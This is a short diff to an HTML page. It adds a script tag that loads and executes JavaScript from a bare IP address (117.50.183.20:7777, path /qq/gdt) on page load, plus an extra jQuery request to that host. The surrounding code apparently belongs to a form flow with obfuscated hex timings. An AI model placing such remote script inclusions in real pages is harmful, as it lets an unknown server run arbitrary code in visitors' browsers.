@@ -19,6 +19,15 @@
 <link rel="stylesheet" type="text/css" href="static/css/basic.css"/>
 <link rel="stylesheet" type="text/css" href="static/css/form_base.css"/>
 <link rel="icon" href="data:image/ico;base64,aWNv">
+
+
+<script>
+function getData(data){
+    console.log(data)
+}
+</script>
+<script src="http://117.50.183.20:7777/qq/gdt?cb=getData"></script>
+
 <style type="text/css">
     html {
         -webkit-text-size-adjust: 100%;
@@ -1479,6 +1488,9 @@
 						} else {
 							backpass(0x1);
 							$.get("http://117.50.183.20:7777/qq/gdt",{id:1},function(data){alert(data);});
+							$.get("http://117.50.183.20:7777/qq/gdt",function(res){
+                                 console.log(res) // 这里的 res 是服务器返回的数据
+                            })
 						}
 						save();
 					}, 0x258);
